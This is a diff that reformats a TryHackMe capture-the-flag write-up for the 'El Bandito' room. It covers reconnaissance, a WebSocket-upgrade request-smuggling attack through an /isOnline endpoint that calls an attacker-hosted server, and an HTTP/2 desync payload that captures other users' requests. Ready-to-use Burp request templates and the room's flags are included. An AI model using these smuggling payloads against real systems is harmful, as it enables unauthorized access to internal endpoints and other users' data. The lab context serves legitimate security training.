@@ -1,3 +1,20 @@
+<div align="center">
+
+# El Bandito — TryHackMe Write-up
+
+<img src="../assets/images/El-Bandito-room-overview.png" width="850">
+
+<br>
+
+![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
+![Category](https://img.shields.io/badge/Category-Web%20Security-blue)
+![Focus](https://img.shields.io/badge/Focus-HTTP%20Smuggling-orange)
+![Protocol](https://img.shields.io/badge/Protocol-HTTP%2F2-green)
+
+</div>
+
+---
+
 # El Bandito — TryHackMe Write-up
 
 ## Room Overview
@@ -10,6 +27,24 @@ Difficulty: **Hard**
 
 ---
 
+## Table of Contents
+
+* [Room Overview](#room-overview)
+* [Objectives](#objectives)
+* [Reconnaissance](#reconnaissance)
+* [Web Enumeration](#web-enumeration)
+* [Directory Enumeration](#directory-enumeration)
+* [Port 8080 Enumeration](#port-8080-enumeration)
+* [JavaScript Analysis](#javascript-analysis)
+* [Service Discovery & Backend Analysis](#service-discovery--backend-analysis)
+* [Exploiting the WebSocket Upgrade Mechanism](#exploiting-the-websocket-upgrade-mechanism)
+* [HTTP/2 Desynchronization Attack](#http2-desynchronization-attack)
+* [Flags](#flags)
+* [Lessons Learned](#lessons-learned)
+* [Conclusion](#conclusion)
+
+---
+
 ## Objectives
 
 1. Find the first web flag
@@ -18,6 +53,10 @@ Difficulty: **Hard**
 ---
 
 ## Reconnaissance
+
+The engagement began with active reconnaissance against the target machine to identify exposed services, application technologies, and potential attack surfaces.
+
+An initial Nmap scan was performed using default scripts and version detection.
 
 ### Nmap Scan
 
@@ -30,15 +69,28 @@ nmap -sC -sV <MACHINE_IP>
 ```text
 PORT     STATE SERVICE VERSION
 
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
 
-631/tcp  open  ipp     CUPS 2.4
-- http-title: Forbidden - CUPS v2.4.12
+631/tcp  open  ipp      CUPS 2.4
+|_http-title: Forbidden - CUPS v2.4.12
 
 80/tcp   open  ssl/http El Bandito Server
-8080/tcp open  http    Nginx
-
+8080/tcp open  http     Nginx
 ```
+
+### Analysis
+
+The scan revealed multiple exposed web services along with an SSH service.
+
+Interesting observations included:
+
+* A CUPS service exposed externally on port `631`
+* An HTTPS web application hosted on port `80`
+* A separate Nginx-based application hosted on port `8080`
+
+Since multiple HTTP services were exposed, the assessment primarily focused on web application enumeration.
+
+---
 
 ## Web Enumeration
 
@@ -76,11 +128,15 @@ This suggested that additional functionality or hidden logic might exist within 
 
 The discovery of the JavaScript file indicated that further web enumeration was required to uncover hidden endpoints and application functionality.
 
+---
+
 ## Directory Enumeration
 
 To identify hidden endpoints and exposed functionality, directory enumeration was performed against the HTTPS service using Gobuster.
 
-```bash id="jlwm8v"
+### Gobuster Scan
+
+```bash
 gobuster dir -u https://<MACHINE_IP>:80/ \
 -w <WORDLIST_PATH> \
 -x txt,js,php,html -k
@@ -88,7 +144,7 @@ gobuster dir -u https://<MACHINE_IP>:80/ \
 
 ### Output
 
-```text id="jlwm1t"
+```text
 /static               (Status: 301)
 /login                (Status: 405)
 /access               (Status: 200)
@@ -102,8 +158,6 @@ gobuster dir -u https://<MACHINE_IP>:80/ \
 ### Analysis
 
 The enumeration process revealed several interesting endpoints exposed by the application.
-
-Notable findings included:
 
 | Endpoint    | Observation                                    |
 | ----------- | ---------------------------------------------- |
@@ -123,31 +177,33 @@ Multiple endpoints also returned successful responses (`HTTP 200 OK`), suggestin
 
 At this stage, the focus shifted toward analyzing the authentication workflow and interacting with the discovered endpoints to identify potential vulnerabilities or logic flaws.
 
+---
+
 ## Further Enumeration
 
-Despite identifying multiple endpoints and an exposed sign-in interface, further manual testing and walkthrough analysis of the web application on port 80 did not immediately reveal any exploitable vulnerabilities or useful information.
+Despite identifying multiple endpoints and an exposed sign-in interface, further manual testing of the application hosted on port `80` did not immediately reveal any exploitable vulnerabilities or useful information.
 
-The discovered functionality appeared intentionally minimal, and the exposed endpoints largely resulted in redirects, restricted methods, or dead ends during initial testing.
+The exposed functionality largely resulted in redirects, restricted methods, or dead ends during initial testing.
 
-At this stage, the attack surface on port 80 appeared exhausted for the moment.
+At this stage, the attack surface on port `80` appeared temporarily exhausted.
 
-To continue the assessment, attention shifted toward another exposed service running on port `8080`, which became the next target for enumeration and analysis.
+Attention then shifted toward another exposed service running on port `8080`.
+
+---
 
 ## Port 8080 Enumeration
 
-After exhausting the initial attack surface on port 80, attention shifted toward another exposed service running on port `8080`.
+Browsing to port `8080` revealed a cryptocurrency-themed application called **Bandit-Coin**.
 
-Browsing to the application revealed a cryptocurrency-themed website called **Bandit-Coin**.
-
-The application appeared to simulate a Web3 cryptocurrency platform and exposed a dashboard-style interface.
+The application simulated a Web3 cryptocurrency platform and exposed a dashboard-style interface.
 
 ### Bandit-Coin Dashboard
 
 ![Bandit-Coin Dashboard](../assets/images/El-Bandito-8080-dashboard.png)
 
-Initial walkthrough and manual testing of the application did not immediately reveal any sensitive information or obvious vulnerabilities.
+Initial walkthrough and manual testing did not immediately expose sensitive functionality.
 
-Since the web application appeared larger and more feature-rich than the previous service, directory enumeration was performed to identify hidden endpoints and administrative functionality.
+Since the application appeared significantly larger than the previous service, additional enumeration was performed.
 
 ### Gobuster Enumeration
 
@@ -176,46 +232,43 @@ gobuster dir -u http://<MACHINE_IP>:8080 \
 
 ### Analysis
 
-The enumeration process exposed multiple potentially sensitive endpoints commonly associated with:
+The enumeration process exposed several potentially sensitive endpoints associated with:
 
-* administration panels
-* debugging functionality
-* environment configurations
-* application health monitoring
+* administrative functionality
+* debugging interfaces
+* environment configuration
 * tracing utilities
 * metrics collection
 
 Several endpoints returning `403 Forbidden` were especially interesting because they confirmed the existence of restricted resources rather than nonexistent paths.
 
-Notable findings included:
+| Endpoint                 | Observation                                  |
+| ------------------------ | -------------------------------------------- |
+| `/admin`                 | Restricted administrative functionality      |
+| `/environment`           | Potential environment configuration exposure |
+| `/metrics`               | Monitoring or observability endpoint         |
+| `/dump`                  | Potential debug or memory dump functionality |
+| `/trace` & `/traceroute` | Possible tracing or diagnostic utilities     |
+| `/error`                 | Returned HTTP 500 Internal Server Error      |
 
-| Endpoint                 | Observation                                       |
-| ------------------------ | ------------------------------------------------- |
-| `/admin`                 | Restricted administrative functionality           |
-| `/environment`           | Potential environment configuration exposure      |
-| `/metrics`               | Possible monitoring or observability endpoint     |
-| `/dump`                  | Potential debug or memory dump functionality      |
-| `/trace` & `/traceroute` | Possible tracing or internal diagnostic utilities |
-| `/error`                 | Returned HTTP 500 Internal Server Error           |
+The `/error` endpoint returning `HTTP 500` strongly suggested backend processing issues and indicated that malformed requests could potentially expose additional behavior.
 
-The `/error` endpoint returning a `500 Internal Server Error` strongly suggested backend processing issues and indicated that the application might expose additional information during malformed requests or forced error conditions.
-
-At this stage, the assessment shifted toward probing these endpoints further for misconfigurations, information disclosure, or access control weaknesses.
+---
 
 ## JavaScript Analysis
 
 While analyzing the exposed `static/messages.js` file discovered earlier during source code inspection, additional application functionality was identified within the client-side JavaScript logic.
 
-Reviewing the script revealed two interesting endpoints used by the application:
+Reviewing the script revealed two interesting endpoints:
 
-```text id="jlwm9q"
+```text
 /getMessages
 /send_message
 ```
 
-The `fetchMessages()` function performed requests to the `/getMessages` endpoint in order to retrieve user messages dynamically.
+The `fetchMessages()` function performed requests to `/getMessages` in order to retrieve user messages dynamically.
 
-```javascript id="jlwm2x"
+```javascript
 fetch("/getMessages")
 ```
 
@@ -223,36 +276,42 @@ fetch("/getMessages")
 
 ![fetchMessages Function](../assets/images/El-Bandito-getmessages-function.png)
 
-Attempting to access `/getMessages` directly through the browser resulted in a redirect back to the login page, indicating that the endpoint required authentication or session validation.
+Attempting to access `/getMessages` directly through the browser resulted in a redirect back to the login page, indicating that authentication was required.
 
-Further analysis of the JavaScript source revealed another function named `sendMessage()` which issued a POST request to the `/send_message` endpoint.
+Further analysis revealed another function named `sendMessage()` which issued POST requests to `/send_message`.
 
-```javascript id="jlwm7r"
+```javascript
 fetch("/send_message", {
 	method: "POST"
 })
 ```
 
-Direct browser access to `/send_message` returned a `Method Not Allowed` response, suggesting that the endpoint specifically expected crafted POST requests rather than standard browser GET requests.
+Direct browser access to `/send_message` returned:
+
+```text
+Method Not Allowed
+```
 
 ### `sendMessage()` Function
 
 ![sendMessage Function](../assets/images/El-Bandito-sendmessage-function.png)
 
-The exposed messaging functionality appeared highly interesting because:
+This behavior suggested that the endpoint specifically expected crafted POST requests rather than standard browser GET requests.
+
+The exposed messaging functionality became highly interesting because:
 
 * authenticated message retrieval was implemented
 * client-side messaging logic was exposed
-* custom POST requests were used for sending data
-* backend interaction endpoints were directly visible within the JavaScript source
+* backend interaction endpoints were visible
+* custom POST requests handled user-controlled data
 
-At this stage, the focus shifted toward interacting with these endpoints directly and analyzing how the backend processed user-controlled input.
+---
 
 ## Service Discovery & Backend Analysis
 
-While further exploring the **Bandit-Coin** dashboard hosted on port `8080`, the application's services section exposed two internal domains along with their status indicators:
+While exploring the **Bandit-Coin** dashboard, the services section exposed two internal domains:
 
-```text id="jlwm8z"
+```text
 http://bandito.websocket.thm  -> OFFLINE
 http://bandito.public.thm     -> ONLINE
 ```
@@ -263,20 +322,20 @@ http://bandito.public.thm     -> ONLINE
 
 Testing the discovered domains revealed different behavior:
 
-* `bandito.public.thm` redirected back to the main web application hosted on port `80`
-* `bandito.websocket.thm` appeared inaccessible externally and remained unresolved through direct browser interaction
+* `bandito.public.thm` redirected back to the main application
+* `bandito.websocket.thm` remained inaccessible externally
 
-This strongly suggested the existence of an internal backend service not directly exposed to external users.
+This strongly suggested the existence of an internal backend service.
 
-Further investigation using the browser developer tools revealed that the dashboard performed backend requests through the following endpoint:
+Further investigation using browser developer tools revealed requests being sent to:
 
-```text id="jlwm4f"
+```text
 /isOnline?url=
 ```
 
-The application issued requests similar to:
+Example request:
 
-```http id="jlwm1u"
+```http
 GET /isOnline?url=http://bandito.websocket.thm HTTP/1.1
 Host: 10.49.178.30:8080
 User-Agent: Mozilla/5.0
@@ -284,26 +343,25 @@ Referer: http://10.49.178.30:8080/services.html
 Connection: keep-alive
 ```
 
-Interestingly, the requests generated different responses depending on the target service:
+Interestingly, the responses differed:
 
 | URL                     | Response |
 | ----------------------- | -------- |
 | `bandito.public.thm`    | HTTP 200 |
 | `bandito.websocket.thm` | HTTP 500 |
 
-The differing responses strongly indicated that the backend application was attempting to communicate with internal services directly.
+This strongly indicated that the backend application was attempting to communicate with internal services directly.
 
-Several observations made this functionality highly suspicious:
+Several observations made this endpoint suspicious:
 
 * user-controlled URLs were processed by the backend
-* internal hostnames were exposed through the dashboard
-* backend requests behaved differently based on target services
-* one service appeared intentionally inaccessible externally
-* the endpoint potentially acted as a proxy or backend connectivity checker
+* internal hostnames were exposed
+* responses differed depending on target service
+* backend connectivity checks appeared implemented
 
-The presence of the `bandito.websocket.thm` hostname also suggested that a WebSocket-related service might exist internally within the infrastructure.
+The `bandito.websocket.thm` hostname strongly suggested internal WebSocket-related functionality.
 
-At this stage, the assessment shifted toward testing whether the `/isOnline` functionality could be abused to interact with internal services or smuggle crafted requests through the backend application.
+---
 
 ## Exploiting the WebSocket Upgrade Mechanism
 
@@ -336,9 +394,7 @@ python3 server.py <PORT_NO>
 
 The supplied argument specifies the listening port for the malicious server.
 
-The objective was to abuse the backend's handling of WebSocket upgrade requests and smuggle additional HTTP requests through the connection.
-
-A crafted request was sent through Burp Repeater:
+A crafted request was then sent through Burp Repeater:
 
 ```http
 GET /isOnline?url=http://<ATTACKER_IP>:<PORT_NO> HTTP/1.1
@@ -350,33 +406,21 @@ Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==late, br
 
 GET /env HTTP/1.1
 Host: 10.10.91.160:8080
-
-
 ```
 
 ### Important Notes
 
-* The payload only worked when **two blank lines** were left after the smuggled request inside Burp Repeater.
-* Burp Repeater's **Update Content-Length** option had to be disabled.
-* The backend incorrectly trusted the upgraded connection and processed the smuggled request internally.
+* Burp Repeater's **Update Content-Length** option had to be disabled
+* Two blank lines had to be left after the smuggled request
+* The backend incorrectly trusted the upgraded connection
 
-Successful exploitation allowed access to the restricted `/env` endpoint.
+Successful exploitation allowed access to restricted internal endpoints.
 
 ### `/env` Response
 
 ![env Response](../assets/images/El-Bandito-env.png)
 
-The same technique was then used against the `/trace` endpoint simply by replacing:
-
-```text
-/env
-```
-
-with:
-
-```text
-/trace
-```
+The same technique was then used against `/trace`.
 
 ### `/trace` Response
 
@@ -389,7 +433,7 @@ The `/trace` response exposed additional sensitive internal paths:
 /admin-flag
 ```
 
-Using the exact same smuggling technique, requests were crafted to retrieve the contents of both endpoints.
+Using the same smuggling technique, requests were crafted to retrieve the contents of both endpoints.
 
 ### `/admin-creds` Response
 
@@ -397,13 +441,13 @@ Using the exact same smuggling technique, requests were crafted to retrieve the 
 
 The retrieved credentials provided administrative access required to continue the challenge.
 
-The `/admin-flag` endpoint exposed the first web flag.
-
 ### `/admin-flag` Response
 
 ![admin-flag Response](../assets/images/El-Bandito-admin-flag.png)
 
-This vulnerability demonstrated a critical flaw in the backend's handling of WebSocket upgrade requests and internal request parsing, ultimately enabling HTTP request smuggling and unauthorized access to restricted internal resources.
+This vulnerability demonstrated a critical flaw in backend request parsing and WebSocket upgrade handling.
+
+---
 
 ## HTTP/2 Desynchronization Attack
 
@@ -411,13 +455,11 @@ Using the previously retrieved administrative credentials, access was gained to 
 
 While analyzing authenticated traffic through Burp Suite, it was observed that the application communicated using the `HTTP/2` protocol.
 
-This introduced the possibility of exploiting HTTP request desynchronization vulnerabilities between the frontend and backend servers.
+HTTP request desynchronization vulnerabilities occur when frontend and backend servers interpret request boundaries differently, allowing attackers to manipulate backend request queues.
 
-The assessment focused on poisoning the backend request queue in order to retrieve requests belonging to other users.
+The assessment focused on poisoning the backend queue to retrieve requests belonging to other users.
 
 ### Smuggled HTTP/2 Request
-
-A crafted desynchronization payload was sent through Burp Repeater:
 
 ```http
 POST / HTTP/2
@@ -433,8 +475,6 @@ Content-Length: 900
 Content-Type: application/x-www-form-urlencoded
 
 data=e
-
-
 ```
 
 The payload abused inconsistencies between HTTP/2 and backend HTTP/1.1 request parsing.
@@ -443,14 +483,14 @@ The backend incorrectly interpreted the smuggled request as a separate HTTP requ
 
 ### Important Notes
 
-* Burp Repeater's **Update Content-Length** option had to be disabled.
-* Two blank lines had to be left after the smuggled request.
-* The payload needed to be sent multiple times through Burp Repeater.
-* The chat application required repeated refreshing in order to receive another user's queued request.
+* Burp Repeater's **Update Content-Length** option had to be disabled
+* Two blank lines had to be left after the smuggled request
+* The payload had to be sent multiple times
+* The chat application required repeated refreshing
 
 Successful exploitation eventually caused another user's request to be processed within the poisoned backend connection.
 
-This allowed retrieval of sensitive application data, including the second flag.
+This resulted in retrieval of the second flag.
 
 ### Second Flag Retrieved
 
@@ -458,7 +498,7 @@ This allowed retrieval of sensitive application data, including the second flag.
 
 This attack demonstrated a critical HTTP/2 desynchronization vulnerability caused by improper request boundary handling between frontend and backend systems.
 
-The vulnerability ultimately enabled backend request poisoning and unauthorized access to other users' application data.
+---
 
 ## Flags
 
@@ -473,3 +513,41 @@ THM{:::MY_DECLINATION:+62°_14'_31.4'':::}
 ```text
 THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}
 ```
+
+---
+
+## Lessons Learned
+
+This room demonstrated several advanced web exploitation concepts and highlighted how modern backend architectures can introduce dangerous attack surfaces when frontend and backend parsing behavior becomes inconsistent.
+
+Key takeaways included:
+
+* Importance of detailed enumeration and source code analysis
+* Discovering hidden functionality through JavaScript inspection
+* Identifying internal services exposed indirectly through backend requests
+* Understanding WebSocket upgrade behavior
+* Exploiting HTTP request smuggling vulnerabilities
+* Performing HTTP/2 desynchronization attacks
+* Backend request queue poisoning techniques
+* Leveraging proxy parsing inconsistencies for unauthorized access
+
+This room was particularly valuable for understanding modern backend exploitation techniques involving reverse proxies, protocol upgrades, and request parsing discrepancies.
+
+---
+
+## Conclusion
+
+El Bandito was an excellent advanced web exploitation challenge focused heavily on modern backend attack vectors.
+
+The room combined:
+
+* reconnaissance
+* JavaScript analysis
+* backend service discovery
+* HTTP smuggling
+* WebSocket upgrade abuse
+* HTTP/2 desynchronization
+
+into a realistic attack chain demonstrating how subtle parsing inconsistencies can lead to severe security vulnerabilities.
+
+This room significantly improved understanding of advanced web application exploitation techniques and backend request handling behavior.
